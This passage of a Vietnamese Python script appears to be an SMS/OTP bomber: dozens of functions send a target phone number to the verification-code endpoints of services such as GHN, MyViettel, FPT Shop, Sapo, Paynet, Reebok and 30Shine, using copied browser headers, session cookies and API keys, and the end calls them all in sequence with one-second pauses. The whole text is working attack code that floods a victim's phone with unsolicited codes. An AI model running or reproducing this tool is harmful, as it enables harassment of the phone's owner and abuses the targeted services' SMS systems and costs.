        'x-nat': 'vi-VN',
        'x-timezone-offset': '7',
    }

    params = {
        'code': 'fc9da32a48e6298d54a7a81dbbbcff50',
        'instanceId': '4fc17ac7-654b-406a-847b-efc9b7171ffa',
        'validate': '921c7b9ec5502202ec88625cb96b913e',
    }

    json_data = {
        'phoneNumber': sdt,
        'verificationCodeType': 1,
    }

    try:
        response = requests.post('https://v9-cc.800best.com/uc/account/sendSignUpCode', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BESTEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BESTEXPRESS | TRẠNG THÁI : THẤT BẠI")

def ghnexpress():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'priority': 'u=1, i',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
        'type': 'register',
    }

    try:
        response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GHNEXPRESS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GHNEXPRESS | TRẠNG THÁI : THẤT BẠI")

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : THẤT BẠI")

def fptshop():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://fptshop.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fptshop.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : THẤT BẠI")

def sapo():
    cookies = {
        'campaign': 'header_app_sapo',
        'referral': 'https://apps.sapo.vn/',
        'G_ENABLED_IDPS': 'google',
        'landing_page': 'https://www.sapo.vn/',
        'start_time': '07/21/2024 12:21:30',
        'pageview': '1',
        'source': 'https://www.sapo.vn/',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'campaign=header_app_sapo; referral=https://apps.sapo.vn/; G_ENABLED_IDPS=google; landing_page=https://www.sapo.vn/; start_time=07/21/2024 12:21:30; pageview=1; source=https://www.sapo.vn/',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    data = {
        'phonenumber': sdt,
    }

    try:
        response = requests.post('https://www.sapo.vn/fnb/sendotp', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("SAPO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("SAPO | TRẠNG THÁI : THẤT BẠI")

def paynet():
    cookies = {
        '__RequestVerificationToken': 'LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1',
        'ASP.NET_SessionId': 'a50onuvzqyt4onxiosf1xnqo',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '__RequestVerificationToken=LM7AlXTmKrjc0v16MMmt2qViZj8BIxkEyLcleS9vHijnP2kbDqJ3fWvJW2t_ecMjOgQiKmyDfITsH7270Y_w2UC_aaFnO1EZFjnbU8hGCZM1; ASP.NET_SessionId=a50onuvzqyt4onxiosf1xnqo',
        'Origin': 'https://merchant.paynetone.vn',
        'Referer': 'https://merchant.paynetone.vn/User/Create',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'MobileNumber': sdt,
        'IsForget': 'N',
    }

    try:
        response = requests.post('https://merchant.paynetone.vn/User/GetOTP', cookies=cookies, headers=headers, data=data, verify=False)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PAYNET | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PAYNET | TRẠNG THÁI : THẤT BẠI")

def reebok():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': '0134f9fc8e5bb3de6352617eacc195a2',
        'origin': 'https://reebok.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://reebok.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1721548395723',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post(
            'https://reebok-api.hsv-tech.io/client/phone-verification/request-verification',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("REEBOK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("REEBOK | TRẠNG THÁI : THẤT BẠI")

def gapowork():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://www.gapowork.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.gapowork.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-gapo-lang': 'vi',
    }

    json_data = {
        'phone_number': sdt,
        'device_id': '726d8613-ca37-46bd-b7af-1b79c102c0cd',
        'device_model': 'web',
    }

    try:
        response = requests.post('https://api.gapowork.vn/auth/v3.1/signup', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("GAPOWORK | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("GAPOWORK | TRẠNG THÁI : THẤT BẠI")

def shine():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        'origin': 'https://30shine.com',
        'priority': 'u=1, i',
        'referer': 'https://30shine.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': sdt,
    }

    try:
        response = requests.post(
            'https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("30SHINE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("30SHINE | TRẠNG THÁI : THẤT BẠI")

def oreka():
    cookies = {
        '__ork_u': '',
        '__ork_u_idt': '',
        '__ork_u_ph': '',
        'AWSALB': 'SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': '',
        'content-type': 'application/json',
        # 'cookie': '__ork_u=; __ork_u_idt=; __ork_u_ph=; AWSALB=SFy9XJT7BhxUFBQ4oATejB5SWs7nFi4yKRr1XGUtyZt7hSmtm3VussWVf+8BHytuZUo4q6vpBbIOD79a4yOsdIXUWFx7fSfAUj0TUsaiB2hf0xr/RYavWSZxYrnK/8ghyF2Clg+zAw9nQfn7eCzjcQfgYpV+wF56nQ3sr/UCvjDwvKVc5B6ev/lq6ipVng==',
        'origin': 'https://www.oreka.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.oreka.vn/login',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-by-platform': 'PC_WEB',
    }

    json_data = {
        'variables': {
            'phone': sdt,
            'locale': 'vi',
        },
        'query': 'mutation ($phone: String!, $locale: String!) {\n  sendVerifyPhoneApp(phone: $phone, locale: $locale)\n}',
    }

    try:
        response = requests.post('https://www.oreka.vn/graphql', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("OREKA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("OREKA | TRẠNG THÁI : THẤT BẠI")

def fmstyle():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'Bearer',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://fm.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://fm.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-apikey': 'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
        'x-emp': '',
        'x-fromweb': 'true',
        'x-requestid': '862aab0f-2da0-4ea4-9e3d-358f619a2ad2',
    }

    json_data = {
        'Phone': sdt,
        'LatOfMap': '106',
        'LongOfMap': '108',
        'Browser': '',
    }

    try:
        response = requests.post('https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FMSTYLE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FMSTYLE | TRẠNG THÁI : THẤT BẠI")

def circa():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'authorization': '',
        'content-type': 'application/json',
        'grpc-timeout': '30S',
        'origin': 'https://circa.vn',
        'priority': 'u=1, i',
        'referer': 'https://circa.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone': {
            'country_code': '84',  # Giả sử mã quốc gia là '84'
            'phone_number': sdt[1:],  # Lấy phần còn lại của số điện thoại
        },
    }

    try:
        response = requests.post('https://api.circa.vn/v1/entity/validation-phone', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("CIRCA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("CIRCA | TRẠNG THÁI : THẤT BẠI")

def acfc():
    cookies = {
        'form_key': 'NAeTVepv8jfDGFEt',
        'mage-cache-storage': '{}',
        'mage-cache-storage-section-invalidation': '{}',
        'recently_viewed_product': '{}',
        'recently_viewed_product_previous': '{}',
        'recently_compared_product': '{}',
        'recently_compared_product_previous': '{}',
        'product_data_storage': '{}',
        'mage-messages': '',
        'optiMonkClientId': '031e2e37-cd11-5d7f-bdd8-87671934b9a6',
        'optiMonkSession': '1721551346',
        'PHPSESSID': 'km715lglu45ngr7e6ubngf6f1a',
        'form_key': 'NAeTVepv8jfDGFEt',
        'private_content_version': 'd62e46921486bf21498614890d7e6251',
        'mgn_location_popup': 'southern',
        'X-Magento-Vary': '1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc',
        'mage-cache-sessid': 'true',
        'aws-waf-token': '9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==',
        'optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'form_key=NAeTVepv8jfDGFEt; mage-cache-storage={}; mage-cache-storage-section-invalidation={}; recently_viewed_product={}; recently_viewed_product_previous={}; recently_compared_product={}; recently_compared_product_previous={}; product_data_storage={}; mage-messages=; optiMonkClientId=031e2e37-cd11-5d7f-bdd8-87671934b9a6; optiMonkSession=1721551346; PHPSESSID=km715lglu45ngr7e6ubngf6f1a; form_key=NAeTVepv8jfDGFEt; private_content_version=d62e46921486bf21498614890d7e6251; mgn_location_popup=southern; X-Magento-Vary=1dedfea16bd448ed11649def077bf655f8a6a95b3f3e1f559074febbe59693fc; mage-cache-sessid=true; aws-waf-token=9ebe372d-9bac-4629-89bf-6c56fe46a184:BgoAlfE7etEyAgAA:Ov9qItJghL7JQES9NLNAtRsyuwLwfsrDWAWFXrzsZxChcKixFyRmyEVRlWBD9hO05D/g9IY+VVeV/lGsgZjEbVvzkuHAUQ9JNL/Yk16tCF1cAiLOQsoz5da1YgVsfqd/Rifxg/HRrA/PeiSv9022XH5JQN92MwBlN2/Zlwea9A+n7vBiarulYu5vWdtUpl4Que2B5ZhkfeN6sJH26VrQWJagIzZLzBq4bBfpu8KWmRMEmhYN9wEKAQ==; optiMonkClient=N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdgCZIIwBmAFgjwBtjEzKJqaJY8A7APYAHVjSxYgA=',
        'origin': 'https://www.acfc.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.acfc.com.vn/customer/account/create/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'number_phone': sdt,
        'form_key': 'NAeTVepv8jfDGFEt',
        'currentUrl': 'https://www.acfc.com.vn/customer/account/create/',
    }

    try:
        response = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("ACFC | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("ACFC | TRẠNG THÁI : THẤT BẠI")

tv360()
time.sleep(1)
beautybox()
time.sleep(1)
kingfood()
time.sleep(1)
batdongsan()
time.sleep(1) 
futabus()
time.sleep(1)
galaxyplay()
time.sleep(1) 
hoangphuc()
time.sleep(1) 
gumac()
time.sleep(1) 
vinamilk()
time.sleep(1)
speedlotte()
time.sleep(1)
medicare()
time.sleep(1)
tokyolife()
time.sleep(1)
vion()
time.sleep(1)
fptreg()
time.sleep(1)
fptreset()
time.sleep(1)
fptresend()
time.sleep(1)
winmart()
time.sleep(1)
tgdidong()
time.sleep(1)
dienmayxanh()
time.sleep(1)
meta()
time.sleep(1)
thefaceshop()
time.sleep(1)
bestexpress()
time.sleep(1)
ghnexpress()
time.sleep(1)
myviettel()
time.sleep(1)
fptshop()
time.sleep(1)
sapo()
time.sleep(1)
paynet()
time.sleep(1)
reebok()
time.sleep(1)
gapowork()
time.sleep(1)
shine()
time.sleep(1)
oreka()
time.sleep(1)
fmstyle()
time.sleep(1)
circa()
time.sleep(1)
acfc()
time.sleep(1)